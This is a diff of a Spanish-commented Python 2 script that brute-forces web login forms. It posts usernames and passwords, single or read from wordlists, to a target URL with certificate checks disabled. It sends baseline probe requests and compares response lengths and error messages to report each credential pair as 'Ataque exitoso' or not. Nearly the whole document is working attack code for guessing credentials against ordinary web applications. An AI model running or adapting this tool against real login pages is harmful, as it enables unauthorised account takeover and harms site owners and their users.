@@ -5,6 +5,7 @@ import sys
 import requests
 import argparse
 import os.path
+from termcolor import colored
 
 arg = ''
 reqFile = ''
@@ -39,102 +40,111 @@ def checkFile(reqFile,user,pwd,userFile,passFile,message):
 		fo.close()
 	
 	
-	
 	if user == '' and pwd == '':
 		doubleFile(url,userField,passField,user,pwd,userFile,passFile,message)
-		print 'double'
 		
 	elif user == '' and passFile == '':
 		usersFile(url,userField,passField,user,pwd,userFile,passFile,message)
-		print 'users'
 	
 	elif userFile == '' and pwd == '':
-		print 'entra pwd'
 		pwdFile(url, userField, passField, user, pwd, userFile, passFile, message)
 		
 	elif userFile == '' and passFile == '':
 		single(url,userField,passField,user,pwd,userFile,passFile,message)
-		print 'single'
 			
 
 
 def single(url, userField, passField, user, pwd, userFile, pwdFile, message):
-	#Antes del ataque
+	mbefore = message
+	requests.packages.urllib3.disable_warnings()		
 	
-	mbefore = message	
-	#Login
-	req = requests.post(url)
+	payadm1 = {userField: '', passField: ''}
+	reqadm1 = requests.post(url,payadm1, verify=False)
 	
-	for key, value in (req.headers).iteritems():
-		if key.startswith('content-length'):
-			print value
-			cb = value
-			print cb
-		else: 
-			continue
+	payadm2 = {userField: '1', passField: ''}
+	reqadm2 = requests.post(url,payadm2,verify=False)
 	
+	payadm3 = {userField: '12', passField: ''}
+	reqadm3 = requests.post(url,payadm3,verify=False)
 	
 	payload = { userField : user, passField: pwd}
-	r = requests.post(url, data= payload)
-	for key,value in (r.headers).iteritems():
-		if key.startswith('content-length'):
-			ca = value
-			op = int(ca) - int(cb)
+	r = requests.post(url, payload, verify=False)
+
+	if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
+		if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
+			print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
 		else:
-			continue			
+			print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
 	
-	
-	mafter =  r.text
-	
-	if mbefore in mafter or op>=110 and op<=120:
-	
-		print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + pwd
-	else:
-		print "Ataque exitoso con:" + "User: " + user  + " Password: " + pwd
+	elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
+		if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
+			print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
+		else:
+			print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
+	else: # Si no se puede determinar mediante content-lenght
+		if mbefore in r.text:
+			print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
+		else:
+			print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
 
 def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 	users = []
+	requests.packages.urllib3.disable_warnings()		
+	
+	payadm1 = {userField: '', passField: ''}
+	reqadm1 = requests.post(url,payadm1, verify=False)
+	
+	payadm2 = {userField: '1', passField: ''}
+	reqadm2 = requests.post(url,payadm2,verify=False)
+	
+	payadm3 = {userField: '12', passField: ''}
+	reqadm3 = requests.post(url,payadm3,verify=False)
+
 	if os.path.exists(userFile): #archivo con usuarios
 		fo = open(userFile, 'r')
 		for element in fo:
 			users.append(element)
 		fo.close()
 		
-		for i in range(0,len(users)):
-			#Antes del ataque
+		for i in range(0,len(users)):	
 			mbefore = message
-			
-			
-			req = requests.post(url)
-			for key, value in (req.headers).iteritems():
-				if key.startswith('content-length'):
-					cb = value
-					#print value
-				else: 
-					continue
-	
-		
+				
 			#Login
-			payload = { userField : users[i], passField: pwd}
-			r = requests.post(url, data= payload)
-			for key, value in (r.headers).iteritems():
-				if key.startswith('content-length'):
-					ca = value
-					op = int(ca) - int(cb)
-					#print op
-				else: 
-					continue
+			payload = { userField : users[i].rstrip('\n'), passField: pwd}
+			r = requests.post(url, data= payload, verify=False)
+			
+			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
+				if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
+					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
+				else:
+					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
 	
-			#Login exitoso
-			mafter =  r.text
-			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
-				print 'Ataque no exitoso con:'  + " User: " + users[i] + " Password: " + pwd
-			else:
-				print "Ataque exitoso con:" + " User: " + users[i]  + " Password: " + pwd
+			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
+				if int(len(r.content)) == int(len(reqadm1.content)) or mbefore in r.content:
+					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
+				else:
+					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
+	
+			else: # Si no se puede determinar mediante content-lenght
+				if mbefore in r.text:
+					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
+				else:
+					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
 
 def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
-	print 'entra pwd'
 	passwords = []
+	
+	requests.packages.urllib3.disable_warnings()		
+	
+	payadm1 = {userField: '', passField: ''}
+	reqadm1 = requests.post(url,payadm1, verify=False)
+	
+	payadm2 = {userField: '1', passField: ''}
+	reqadm2 = requests.post(url,payadm2,verify=False)
+	
+	payadm3 = {userField: '12', passField: ''}
+	reqadm3 = requests.post(url,payadm3,verify=False)
+	
 	if os.path.exists(pwdFile): #archivo con usuarios
 		fo = open(pwdFile, 'r')
 		for element in fo:
@@ -145,41 +155,45 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
 			#Antes del ataque
 			mbefore = message
 		
-			req = requests.post(url)
-			for key, value in (req.headers).iteritems():
-				if key.startswith('content-length'):
-					cb = value
-				
-				else: 
-					continue
-	
 			#Login
-			payload = { userField : user, passField: passwords[i]}
-			r = requests.post(url, data= payload)
-			for key, value in (r.headers).iteritems():
-				if key.startswith('content-length'):
-					ca = value
-					op = int(ca) - int(cb)
-					
-				else: 
-					continue
-	
-	
-			#Login exitoso
-			mafter =  r.text
-			if mbefore in mafter or op <= 0 or op>=110 and op<=120:
+			payload = { userField : user, passField: passwords[i].rstrip('\n')}
+			r = requests.post(url, data= payload, verify=False)
 			
-				print 'Ataque no exitoso con:'  + " User: " + user + " Password: " + passwords[i]
-			else:
-				print "Ataque exitoso con:" + " User: " + user  + " Password: " + passwords[i]
+			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
+				if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
+					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
+				else:
+					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
+			
+			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
+				if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
+					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
+				else:
+					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
+					
+			else: # Si no se puede determinar mediante content-lenght
+				if mbefore in r.text:
+					print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
+				else:
+					print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
 
 
 def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message):
-	print 'double'
 	users = []
 	passwords = []
 	i = 0
 	j = 0
+	
+	requests.packages.urllib3.disable_warnings()		
+	
+	payadm1 = {userField: '', passField: ''}
+	reqadm1 = requests.post(url,payadm1, verify=False)
+	
+	payadm2 = {userField: '1', passField: ''}
+	reqadm2 = requests.post(url,payadm2,verify=False)
+	
+	payadm3 = {userField: '12', passField: ''}
+	reqadm3 = requests.post(url,payadm3,verify=False)
 	
 	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
 		
@@ -198,35 +212,33 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message)
 				#Antes del ataque
 				mbefore = message
 				
-				req = requests.post(url)
-				for key, value in (req.headers).iteritems():
-					if key.startswith('content-length'):
-						cb = value
-						#print value
-					else: 
-						continue
 				#Login
-				payload = { userField : users[i], passField: passwords[j]}
 				
-				r = requests.post(url, data= payload)
-				for key, value in (r.headers).iteritems():
-					if key.startswith('content-length'):
-						ca = value
-						op = int(ca) - int(cb)
-						#print op
-					else: 
-						continue
-	
-				#Login exitoso
-				mafter =  r.text
-				
-				if mbefore in mafter or op <= 0 or op>=110 and op<=120:
-					print 'Ataque no exitoso con:'  + " User: " + users[i] , " Password: " + passwords[j]
-				else:
-					print "Ataque exitoso con:" + " User: " + users[i]  , " Password: " + passwords[j]
-					
-				j + 1
-			i + 1
+				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
+				r = requests.post(url, data= payload, verify=False)
+			
+				if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
+					if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
+						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
+						
+						j + 1
+					else:
+						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
+						j + 1
+						
+				elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
+					if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
+						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
+						j + 1
+					else:
+						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
+						j + 1
+				else: # Si no se puede determinar mediante content-lenght
+					if mbefore in r.text:
+						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
+					else:
+						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
+		i + 1	
 
 
 
